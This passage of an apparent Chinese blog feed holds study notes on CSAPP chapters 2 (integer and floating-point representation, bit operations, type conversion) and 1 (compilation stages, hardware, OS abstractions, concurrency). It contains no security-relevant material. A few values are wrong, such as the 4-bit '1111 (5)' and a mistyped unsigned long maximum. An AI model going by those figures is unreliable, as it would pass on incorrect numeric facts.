&quot;12345&quot;</code>，那么实际上的存储顺序就是 <code>s[0]=&#39;1&#39;,s[1]=&#39;2&#39;,s[2]=&#39;3&#39;,s[3]=&#39;4&#39;,s[4]=&#39;5&#39;,s[5]=&#39;null&#39;</code>。需要注意，就算我们在编写存储字符串时并没有编写末尾的空字节，机器也会自动补充在字符串的末尾也就是最高位上。</p><p>空字节被包含在字符串当中，我们在限制字符串输入长度时需要注意防止溢出。</p><h3 id="表示代码"><a href="#表示代码" class="headerlink" title="表示代码"></a>表示代码</h3><p>不同机器类型使用不同且不兼容的指令和编码方式，二进制码是不兼容的。</p><p>从机器的角度来看，程序就仅仅是字节序列，不会有特定的信息来指示源程序。</p><h3 id="布尔代数简介"><a href="#布尔代数简介" class="headerlink" title="布尔代数简介"></a>布尔代数简介</h3><p>布尔代数是在二元集合 <code>&#123;0，1&#125;</code> 基础上的定义，在此基础上我们可以进行相关的运算。</p><ul><li><p>与</p><p>1与1为1，1与0为0，0与1为0，0与0为0</p></li><li><p>或</p><p>1或1为1，1或0为1，0或1为1，0或0为0</p></li><li><p>非</p><p>非0为1，非1为0</p></li><li><p>亦或</p><p>1异或1为0，1异或0为1，0异或1为1，0异或0为0</p></li></ul><h3 id="C语言中的运算"><a href="#C语言中的运算" class="headerlink" title="C语言中的运算"></a>C语言中的运算</h3><h4 id="位级运算"><a href="#位级运算" class="headerlink" title="位级运算"></a>位级运算</h4><p>C语言支持按位的布尔运算，每一位之间独立的进行运算。例如向量 <code>[a,b,…,c]</code> 和 <code>[A,B,…,C]</code> ，我们就可以把每一位元素拿出来单独进行运算，每一位结果为新向量对应位的结果。</p><p>在 C 语言中，以上逻辑运算对应的符号分别为：</p><ul><li>非：~</li><li>与：&amp;</li><li>或：|</li><li>异或：^</li></ul><h5 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h5><p>C 语言中我们用 bool 类型来表示逻辑运算结果，<code>true </code>表示 <code>真(1)</code>，<code>false </code> 表示 <code>假(0)</code> 。逻辑运算有单独的运算符：</p><ul><li><code>&amp;&amp;</code>（逻辑与）：如果两个操作数都为真，则结果为真；否则，结果为假。</li><li><code>||</code>（逻辑或）：如果至少有一个操作数为真，则结果为真；如果两个操作数都为假，则结果为假。</li><li><code>!</code>（逻辑非）：用于取反操作数的值，如果操作数为真，则取反后为假，如果操作数为假，则取反后为真。</li></ul><blockquote><p>bool 数据在进行运算时，会把所有参与运算的值转为 <code>bool</code> 类型，<code>0</code> 就是 <code>0</code>，不是 <code>0</code> 一律都是 <code>1</code>。</p></blockquote><h4 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h4><p>移位运算分为左移和右移，分别用符号 <code>&lt;&lt;</code> 和 <code>&gt;&gt;</code> 表示。</p><p>假设整数 <em>X</em> 一共 w 位，<code>X&gt;&gt;k</code> 右移 k 位表示丢弃低 k 位，原来的高 <code>w-k</code> 位变为低 <code>w-k</code> 位，高 <code>k</code> 位变为0。<code>X&lt;&lt;k</code> 左移 k 位表示丢弃高 k 位，原来的低 <code>w-k</code> 位变为高 <code>w-k</code> 位，低 <code>k</code> 位变为0。</p><p>其中右移运算又分为<strong>算术右移</strong>和<strong>逻辑右移</strong>。二者之间的差异就是高位填充值的不同，算术右移复制最高位，逻辑右移填充0。</p><p>由于算术右移的高位填充的是原本的最高位值而不是0，所以<strong>算术右移用于处理带符号整数，逻辑右移用于处理无符号整数</strong>。</p><h2 id="整数表示"><a href="#整数表示" class="headerlink" title="整数表示"></a>整数表示</h2><h3 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h3><p>C语言有多种不同的整数数据类型，用来表示不同范围的整数。每一种类型都可以用关键字来指定大小以及数字的正负。根据字节分配，不同的大小所能表示的值的范围不同，具体如下表：</p><blockquote><p>64位和32位只用long指示符的取值范围不同，括号内为32位对应的取值范围</p></blockquote><table><thead><tr><th>C数据类型</th><th>最小值</th><th>最大值</th></tr></thead><tbody><tr><td>char</td><td>-128</td><td>127</td></tr><tr><td>unsigned char</td><td>0</td><td>255</td></tr><tr><td>short</td><td>-32768</td><td>32767</td></tr><tr><td>unsigned short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808 (-2147483648)</td><td>9223372036854775807 (2147483647)</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615 (4294967295)</td></tr></tbody></table><p>如上表我们可以发现，有符号的数据类型在正数和负数的范围并不严格对称，负数范围总是比正数大1。</p><p>需要注意的是，通常C语言中<strong>大多数的数字都默认为有符号</strong>，要创建无符号常量必须加上后缀字符 <code>&#39;u&#39;</code> 或 <code>&#39;U&#39;</code>。例如声明 <code>12345</code> 这样的常量就被认为是有符号的， <code>0x12b4u</code> 才会被认为是无符号常量。</p><h4 id="无符号数的编码"><a href="#无符号数的编码" class="headerlink" title="无符号数的编码"></a>无符号数的编码</h4><p>无符号数实际上就是非负数，就是只包括正数和 0 的部分。无符号数没有符号位，因此他们的编码范围始终从 0 开始。</p><p>无符号整数的编码方法通常基于二进制表示，每位（或位组合）可以表示 2 个可能的值：0和1。编码中没有符号位，<strong>最高位通常是最高有效位</strong>，表示最大的权值。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E6%97%A0%E7%AC%A6%E5%8F%B7%E7%BC%96%E7%A0%81.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>位二进制编码：<span class="hljs-number">0000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">1001</span> (<span class="hljs-number">9</span>), <span class="hljs-number">1111</span> (<span class="hljs-number">5</span>)<br><span class="hljs-attribute">8</span>位二进制编码：<span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">01011010</span> (<span class="hljs-number">90</span>), <span class="hljs-number">11111111</span> (<span class="hljs-number">255</span>)<br></code></pre></td></tr></table></figure><blockquote><p>就是最简单的正常二进制表示方法 </p></blockquote><h4 id="补码编码"><a href="#补码编码" class="headerlink" title="补码编码"></a>补码编码</h4><p>实际运用中不仅只有正数数据，我们还想要实现负数值，补码就是最常见的负数表示方法。</p><p>在补码的定义中，<strong>字的最高位为符号位</strong>。符号位为0表示正数，符号位为1表示负数。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">8</span>位二进制补码： <span class="hljs-number">00000000</span> (<span class="hljs-number">0</span>), <span class="hljs-number">00000101</span> (<span class="hljs-number">5</span>), <span class="hljs-number">11111011</span> (-<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>在单纯的二进制数字层面，由于最高位是最高权值，所以在位数相同的情况下，最高位是 1 的二进制数永远大于最高位是 0 的二进制数。因此正负数补码对应的二进制范围是没有交集的，所以无论其他位如何变化都不会使某个数据的正负混淆。</p><h3 id="有符号数与无符号数的转换"><a href="#有符号数与无符号数的转换" class="headerlink" title="有符号数与无符号数的转换"></a>有符号数与无符号数的转换</h3><p>有符号数和无符号数之间的转换分为两种：显示转换和隐式转换。</p><p><strong>显示转换</strong>也称强制类型转换，需要使用特定的语法和类型转换操作符。例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = (<span class="hljs-type">int</span>) unsignedValue ; <br>unsignedValue = (<span class="hljs-type">unsigned</span>) signedValue;<br></code></pre></td></tr></table></figure><blockquote><p>需要注意的是，显示转换可能导致数据截断或数据丢失。</p></blockquote><p><strong>隐式转换</strong>也称为自动类型转换或自动升级，由编译器自动执行，以使表达式或操作能够成功进行。</p><p>例如，将一种类型的表达式赋值给另外一种类型的变量，编译器会自动执行隐式转换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> signedValue;<br><span class="hljs-type">unsigned</span> unsignedValue ;<br><br>signedValue = unsignedValue ; <br>unsignedValue = signedValue;<br></code></pre></td></tr></table></figure><p>不同类型的变量进行运算时发生的也是隐式转换。</p><p>隐式转换原则：</p><ul><li><p>在混合使用浮点数和整数类型时，通常将整数提升为浮点数，出现过double则结果一定为double</p></li><li><p>若都是整数参与运算则结果也是整数</p></li><li><p>整数运算的结果为出现过的位数最大的整数，若最大的整数中有无符号类型的则结果无符号。</p></li></ul><h3 id="扩展一个数字的位表示"><a href="#扩展一个数字的位表示" class="headerlink" title="扩展一个数字的位表示"></a>扩展一个数字的位表示</h3><p>要将无符号数转化成一个更大的数据类型，我们只需要在开头添加 <code>0</code> 即可。这种运算称为 <strong>0 扩展</strong>。</p><p>但是如果是将补码数字转换为更大的数据类型，将会执行<strong>符号扩展</strong>，非负数开头添加 <code>0</code> ，负数则需要开头添 <code>1</code>。</p><p>我们运行下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">short</span> x=<span class="hljs-number">0x1234</span>;<br>    <span class="hljs-type">short</span> y=<span class="hljs-number">-0x1234</span>;<br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>    <span class="hljs-type">int</span> x1=x;<br>    <span class="hljs-type">int</span> y1=y;<br>    show_bytes(&amp;x1,<span class="hljs-keyword">sizeof</span>(x1));<br>    show_bytes(&amp;y1,<span class="hljs-keyword">sizeof</span>(y1));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">34 12 <br>cc ed<br>34 12 00 00<br>cc ed ff ff<br></code></pre></td></tr></table></figure><h3 id="截断数字"><a href="#截断数字" class="headerlink" title="截断数字"></a>截断数字</h3><p>我们需要减少一个数字的位数时就需要截断数字，当我们将 w 位的数字截断为 k 位数字时，我们就会丢弃有效位的高 <code>w-k</code> 位，补码数字的符号位是始终不变的。</p><p>需要注意有符号数的阶段可能会发生溢出现象。例如，一个8位带符号整数，其范围是从 -128 到 127。如果原始带符号整数为 -150，将其截断为 8 位带符号整数会导致溢出，因为 -150 不在 -128 到 127 的范围内。截断后的结果可能是正数 106，这是 -150 的溢出结果，这不是原始值的正确表示。</p><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><h4 id="加法"><a href="#加法" class="headerlink" title="加法"></a>加法</h4><p>无符号加法遵循二进制的加法规则，从最低位（最右边的位）开始逐位相加，进位会传递到高位。</p><p>补码加法仍然遵循标准的二进制加法规则，但符号位也会参与计算。当执行补码加法时，符号位与其他位一起相加，如果有溢出，则溢出会影响符号位。</p><h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><p>无符号乘法遵循标准的乘法规则，乘法有 <code>x*y=(x*y) mod 2^w</code> 其中 <code>w</code> 为 <code>x </code>和 <code>y</code> 的位数。需要注意，因为 <code>x</code> 和 <code>y</code> 相乘可能得到最大 <code>2w</code> 位的整数，因此可能会发生截断。</p><p>补码乘法同样遵循标准的乘法规则，但符号位也会参与计算。可以理解为先像无符号乘法，乘出来截断之后再转为补码就是结果。</p><h4 id="除以2的幂"><a href="#除以2的幂" class="headerlink" title="除以2的幂"></a>除以2的幂</h4><p>除以 2 的幂通过右移运算来实现，无符号和补码数分别使用逻辑移位和算术移位来实现。</p><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><h3 id="二进制小数"><a href="#二进制小数" class="headerlink" title="二进制小数"></a>二进制小数</h3><p>二进制小数的表示方法和十进制原理相同，只不过十进制的底数为 10，二进制的权值底数变成了 2。</p><h3 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h3><p>IEEE浮点标准用如下的公式来表示一个数：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-IEEE%E6%B5%AE%E7%82%B9%E6%95%B0%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95.png"></p><ul><li>符号(s)：<code>1</code> 表示负数，<code>0</code> 表示正数</li><li>尾数(M)：是一个二进制的小数，取值范围为 <code>[1,2)</code></li><li>阶码(E)：为浮点数加权。</li></ul><blockquote><p>这个方法就相当于是二进制的科学计数法。</p></blockquote><p>浮点数可以分为三个字段：符号位，阶码字段和小数字段。</p><p>我们经常用的浮点数有两类，单精度浮点数 <code>float</code> 和双精度浮点数 <code>double</code>，<code>float</code> 为 <code>32</code> 位，<code>double</code> 为 <code>64</code> 位。</p><ul><li>对于 <code>float</code>，最高位表示符号位；第 <code>2</code> 到第 <code>9</code> 位表示阶码，用来指示指数位；第 <code>10</code> 位到第 <code>32</code> 位均为尾数</li><li>对于 <code>double</code>，最高位表示符号位；第 <code>2</code> 到第 <code>12</code> 位表示阶码，用来指示指数位；第 <code>13</code> 位到第 <code>64</code> 位均为尾数</li></ul><p>根据阶码部分的值，被编码的值有 <code>3 </code>中表示的情况：</p><ul><li><p>规格化的值：阶码位不为全 <code>0</code> 也不为全 <code>1</code>。此时阶码字段被解释为以偏置形式表示的有符号整数。对应的阶码的值是 <code>E=e-(2^k-1)</code></p></li><li><p>非规格化的值：当阶码位全为 <code>0</code> 的时候，表示非规格化的值。此时阶码字段被解释为以偏置形式表示的有符号整数。对应的阶码的值是 <code>E=1-(2^k-1)</code></p><p>非格式化数可以用来表示非常接近于 0.0 的数，它提供了一种逐渐溢出的属性使可能的数值均匀的接近于 0.0。</p></li><li><p>特殊值：包括 <code>INF</code> 和 <code>NAN</code>，阶码位全为 <code>1</code> 的时候，若尾数全为0，则得到 <code>INF</code>，若不全为 <code>0</code> 则得到 <code>NAN</code>。</p></li></ul><h4 id="舍入"><a href="#舍入" class="headerlink" title="舍入"></a>舍入</h4><p>因为浮点数的表示方法限制了浮点数的范围和精度，多以我们需要利用特定的系统的方法使存储的数据无限接近于实际的数字，这就是舍入的工作。</p><p>总共有四种舍入的方法，下表为原理示例：</p><table><thead><tr><th align="center">方式</th><th align="center">1.40</th><th align="center">1.60</th><th align="center">1.50</th><th align="center">2.50</th><th align="center">-1.50</th></tr></thead><tbody><tr><td align="center">向偶数舍入</td><td align="center">1</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">向零舍入</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-1</td></tr><tr><td align="center">向下舍入</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">2</td><td align="center">-2</td></tr><tr><td align="center">向上舍入</td><td align="center">2</td><td align="center">2</td><td align="center">2</td><td align="center">3</td><td align="center">-1</td></tr></tbody></table><blockquote><p>其中，向偶数舍入也就是向最近的值舍入，其他的方法原理均和字面含义相同</p></blockquote><h4 id="浮点运算"><a href="#浮点运算" class="headerlink" title="浮点运算"></a>浮点运算</h4><p>浮点数的加法和减法遵循一般的二进制加法和减法规则，但需要额外考虑指数部分的对齐。</p><p>浮点数的乘法和除法也遵循一般的二进制乘法和除法规则，但需要额外的处理来正确处理指数和尾数。具体来说，乘法时将指数相加，尾数相乘，然后对结果进行规范化。除法时将指数相减，尾数相除，然后对结果进行规范化。</p><hr><p>开学喽🥲</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第一章 计算机系统漫游 总结</title>
    <link href="/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/31/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>第一章是总论，把一下简单的概念梳理了一下</p><span id="more"></span><h1 id="程序的编译"><a href="#程序的编译" class="headerlink" title="程序的编译"></a>程序的编译</h1><p>带有 <code>.c</code> 后缀的C语言源文件是不能直接在程序上运行的，需要将其中的C语句转换为机器语言，按照<strong>可执行目标程序</strong>的格式打好包，并以二进制磁盘文件的形式存放起来。目标程序也称为<strong>可执行目标文件。</strong></p><p>我们常使用的编译命令 <code>gcc -o hello hello.c</code> ，具体的编译过程分为四个阶段：(1) 预处理；(2) 编译；(3) 汇编；(4) 链接；</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png"></p><h3 id="01-预处理"><a href="#01-预处理" class="headerlink" title="01 预处理"></a>01 预处理</h3><p>预处理器将根据将读取所有的 <code>#include</code> 头文件以及宏定义，把他们插入文本中，将原本的命令替换成其具体详细的内容。</p><p>处理结果是得到 <code>.i</code> 文本文件</p><h3 id="02-编译"><a href="#02-编译" class="headerlink" title="02 编译"></a>02 编译</h3><p>编译器将 <code>.i</code> 文件转换为 <code>.s</code> 文件，其代码指令由C语言代码转为汇编指令。文件中包含函数 main 的定义，类似下图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main:<br>pushq %rbp<br>movq %rsp ,%rbp<br>leaq .LC0 ,%rdi<br>call puts@PLT<br>movl $0 ,%eax<br>popq %rbp<br>ret<br></code></pre></td></tr></table></figure><h3 id="03-汇编"><a href="#03-汇编" class="headerlink" title="03 汇编"></a>03 汇编</h3><p>汇编器将 <code>.s</code> 文件的人类可读的文本指令转换为计算机可读的二进制机器语言指令，把这些指令打包成一种叫做<strong>可重定位目标程序</strong>（relocatable object program）的格式，并将结果保存在 <code>.o</code> 文件中。</p><p>此时的文件用文本编辑器打开的话内容将是乱码。</p><h3 id="04-链接"><a href="#04-链接" class="headerlink" title="04 链接"></a>04 链接</h3><p>链接器 .o 目标文件与其他目标文件、库文件、启动文件等链接起来<strong>生成可执行目标文件</strong>。</p><p>例如我们在程序中调用 printf 函数，printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须由链接器合并到我们的 hello.o 程序中。</p><h1 id="系统的硬件组成"><a href="#系统的硬件组成" class="headerlink" title="系统的硬件组成"></a>系统的硬件组成</h1><p>系统硬件由四部分组成：总线、I&#x2F;O设备、主存和处理器</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png"></p><h3 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h3><p>总线就是贯穿整个系统的电子管道，负责在各个部件之间传递信息。</p><p>通常总线被设计成传送定长的字节块，也就是计算机处理数据的基本单元大小<strong>字（word）</strong>。不同系统中的机器字长不同，大部分是 4 字节（32位）和 8 字节（64位）。</p><h3 id="I-x2F-O-设备"><a href="#I-x2F-O-设备" class="headerlink" title="I&#x2F;O 设备"></a>I&#x2F;O 设备</h3><p>I&#x2F;O（输入&#x2F;输出）设备就是系统与外界联系的通道。像键盘鼠标，以及磁盘驱动器、网络驱动器之类的硬件都是 I&#x2F;O 设备。</p><p>每个 I&#x2F;O 设备都通过一个<strong>控制器</strong>或<strong>适配器</strong>与 I&#x2F;O 总线相连，负责在二者之间传递信息。</p><blockquote><p>控制器是 I&#x2F;O 设备本身或者系统的主印制电路板（主板）上的芯片组</p><p>适配器是一块插在主板插槽上的卡</p></blockquote><h3 id="主存"><a href="#主存" class="headerlink" title="主存"></a>主存</h3><p>从物理上来说，主存是由一组<strong>动态随机存取存储器</strong>（DRAM）芯片组成的。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</p><blockquote><p>主存也就是我们会在购买电脑时在详情页中看到的“运行内存”，代表程序可以同时运行的程序和数据大小</p></blockquote><h3 id="处理器"><a href="#处理器" class="headerlink" title="处理器"></a>处理器</h3><p><strong>中央处理单元</strong>（CPU），简称<strong>处理器</strong>，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或<strong>寄存器</strong>），称为<strong>程序计数器</strong>（PC）。</p><p>在任何时刻，PC 都指向主存中的某条机器语言指令（即含有该条指令的地址）。</p><blockquote><p>此 PC 非 “个人计算机” PC 哦</p></blockquote><p>从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令，再更新程序计数器，使其指向下一条指令，不断循环往复。这个过程围绕着主存、<strong>寄存器文件</strong>（register file）和<strong>算术&#x2F;逻辑单元</strong>（ALU）进行。</p><h3 id="运行一个程序"><a href="#运行一个程序" class="headerlink" title="运行一个程序"></a>运行一个程序</h3><p>假设我们目标运行的程序将输出 “hello world！”，我们在命令行解释器shell中直接输入文件名，系统就会执行文件并作出相应的输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">linux&gt; </span><span class="language-bash">./hello</span><br>hello world！<br></code></pre></td></tr></table></figure><p>在计算机层面，运行程序就是不断复制的一个过程，大致分为以下几个流程：</p><p>首先我们在键盘上输入字符串 <code>”./hello“</code> ，shell 会将其字符逐一读入寄存器，再把他们放入内存中。</p><p>![](&#x2F;img&#x2F;CSAPP-第一章-计算机系统漫游-总结&#x2F;1-read hello from keyboard.png)</p><p>敲击回车键以后，shell 就会执行一系列指令来加载可执行的 hello 文件，这些指令将会把目标文件中的代码和数据复制到主存。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E4%BB%8E%E7%A3%81%E7%9B%98%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%B0%E4%B8%BB%E5%AD%98.png"></p><p>接下来，CPU就会开始处理 目标程序的 main 程序中的机器语言指令。这些指令将会把将要输出的字符串中的字节从主存复制到寄存器文件，再从寄存器复制到显示设备，最终显示到屏幕上。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E5%B0%86%E8%BE%93%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BB%8E%E5%AD%98%E5%82%A8%E5%99%A8%E5%86%99%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8.png"></p><h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1><p>我们可以把操作系统理解为应用程序和硬件之间的一层软件，所有应用对硬件的操作尝试都必须经过操作系统。</p><p>![](&#x2F;img&#x2F;CSAPP-第一章-计算机系统漫游-总结&#x2F;1-操作系统 .png)</p><p>操作系统的功能：</p><ul><li><p>防止硬件被失控的应用程序滥用</p></li><li><p>向应用程序提供简单一致的机制来控制低级硬件设备</p></li></ul><p>操作系统通过三个抽象概念来实现上述功能：进程、虚拟内存、文件</p><p>三个概念的关系如下图所示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E5%85%B3%E7%B3%BB.png"></p><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><p><strong>进程</strong>是操作系统对正在运行的程序的一种抽象。</p><p><strong>线程</strong>是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一个进程由多个线程组成，每个线程都运行在进程的上下文中，共享同样的代码和数据。</p><p><strong>并发运行</strong>是指一个进程的指令和另一个进程的指令交错执行，多个进程同时活动。一个CPU通过上下文切换实现并发执行多个程序。</p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><strong>虚拟内存</strong>是主存和I&#x2F;O设备的抽象，它为进程提供一种独立占用内存的假象。</p><p>每个进程看到的内存都是一致的，称为<strong>虚拟地址空间</strong>。每个进程看到的虚拟地址空间由大量准确定义的区构成，每个区都有专门的功能。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%80%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8-%E6%80%BB%E7%BB%93/1-%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png"></p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>文件就是<strong>字节序列</strong>，每个I&#x2F;O设备，包括磁盘、键盘、显示设备，甚至网络都可看为文件。</p><h1 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h1><h3 id="Amdahl-定律"><a href="#Amdahl-定律" class="headerlink" title="Amdahl 定律"></a>Amdahl 定律</h3><p>Amdahl 定律（也叫阿姆达尔定律）主要思想是，当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。</p><p>所以，<strong>要想显著加速整个系统，必须提升全系统中相当大的部分的速度</strong>。</p><h3 id="并行和并发"><a href="#并行和并发" class="headerlink" title="并行和并发"></a>并行和并发</h3><p><strong>并发</strong>是指一个同时具有多个活动的系统。</p><p><strong>并行</strong>是指用并发来使一个系统运行得更快。</p><h4 id="线程级并发"><a href="#线程级并发" class="headerlink" title="线程级并发"></a>线程级并发</h4><p>构建在进程这个抽象之上，我们能够设计出同时有多个程序执行的系统，这就导致了并发。使用线程，我们甚至能够在一个进程中执行多个控制流。</p><p><strong>多处理器系统</strong>是由单操作系统内核控制的多处理器组成的系统。</p><p><strong>多核处理器</strong>是将多个CPU(称为”核”)集成到一个集成电路芯片上。</p><p>超线程，有时称为<strong>同时多线程</strong>（simultaneous multi-threading），是一项允许一个 CPU 执行多个控制流的技术。超线程的处理器可以在单个周期的基础上决定要执行哪一个线程，比如，假设一个线程必须等到某些数据被装载到高速缓存中，那在这个装在过程中， CPU 就可以继续去执行另外的一个线程。</p><h4 id="指令级并行"><a href="#指令级并行" class="headerlink" title="指令级并行"></a>指令级并行</h4><p>现代处理器可以同时执行多条指令的属性称为指令级并行。</p><p><strong>超标量处理器</strong>是指可以达到比一个周期一条指令更快的执行速率的处理器。</p><h4 id="单指令、多数据并行"><a href="#单指令、多数据并行" class="headerlink" title="单指令、多数据并行"></a>单指令、多数据并行</h4><p>单指令、多数据，即 SIMD 